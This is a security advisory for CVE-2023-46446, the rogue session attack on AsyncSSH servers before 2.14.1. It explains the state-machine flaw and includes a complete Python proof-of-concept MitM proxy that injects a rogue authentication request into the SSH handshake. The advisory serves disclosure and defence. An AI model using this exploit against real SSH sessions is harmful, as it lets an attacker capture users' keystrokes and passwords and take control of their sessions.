# AsyncSSH Rogue Session Attack

**GHSA**: GHSA-c35q-ffpf-5qpm | **CVE**: CVE-2023-46446 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-345, CWE-349, CWE-354, CWE-359, CWE-639

**Affected Packages**:
- **asyncssh** (pip): < 2.14.1

## Description

### Summary

An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.

### Details

The rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.

The attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.

### PoC

<details>
  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>

  ```python
  #!/usr/bin/python3
  import socket
  from threading import Thread
  from binascii import unhexlify
  from time import sleep
  
  ##################################################################################
  ## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
  ##                                                                              ##
  ## Variant: Unmodified variant (EXT_INFO by client required)                    ##
  ##                                                                              ##
  ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##
  ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##
  ##                                                                              ##
  ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
  ##################################################################################
  
  # IP and port for the TCP proxy to bind to
  PROXY_IP = '127.0.0.1'
  PROXY_PORT = 2222
  
  # IP and port of the server
  SERVER_IP = '127.0.0.1'
  SERVER_PORT = 22
  
  # Length of the individual messages
  NEW_KEYS_LENGTH = 16
  CLIENT_EXT_INFO_LENGTH = 60
  # Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)
  ADDITIONAL_CLIENT_DATA_LENGTH = 60
  
  newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
  def contains_newkeys(data):
      return newkeys_payload in data
  
  rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
  def insert_rogue_authentication_request(data):
      newkeys_index = data.index(newkeys_payload)
      # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
      return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]
  
  def forward_client_to_server(client_socket, server_socket):
      delay_next = False
      try:
          while True:
              client_data = client_socket.recv(4096)
              if delay_next:
                  delay_next = False
                  sleep(0.25)
              if contains_newkeys(client_data):
                  print("[+] SSH_MSG_NEWKEYS sent by client identified!")
                  if len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                      print("[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!")
                  while len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                      client_data += client_socket.recv(4096)
                  print(f"[d] Original client_data before modification: {client_data.hex()}")
                  client_data = insert_rogue_authentication_request(client_data)
                  print(f"[d] Modified client_data with rogue authentication request: {client_data.hex()}")
                  delay_next = True
              if len(client_data) == 0:
                  break
              server_socket.send(client_data)
      except ConnectionResetError:
          print("[!] Client connection has been reset. Continue closing sockets.")
      print("[!] forward_client_to_server thread ran out of data, closing sockets!")
      client_socket.close()
      server_socket.close()
  
  def forward_server_to_client(client_socket, server_socket):
      try:
          while True:
              server_data = server_socket.recv(4096)
              if len(server_data) == 0:
                  break
              client_socket.send(server_data)
      except ConnectionResetError:
          print("[!] Target connection has been reset. Continue closing sockets.")
      print("[!] forward_server_to_client thread ran out of data, closing sockets!")
      client_socket.close()
      server_socket.close()
  
  if __name__ == '__main__':
      print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
      mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      mitm_socket.bind((PROXY_IP, PROXY_PORT))
      mitm_socket.listen(5)
  
      print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
  
      try:
          while True:
              client_socket, client_addr = mitm_socket.accept()
              print(f"[+] Accepted connection from: {client_addr}")
              print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
              server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              server_socket.connect((SERVER_IP, SERVER_PORT))
              print("[+] Spawning new forwarding threads to handle client connection.")
              Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
              Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
      except KeyboardInterrupt:
          client_socket.close()
          server_socket.close()
          mitm_socket.close()
  ```
</details>

### Impact

The impact heavily depends on the application logic implemented by the AsyncSSH server. In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.
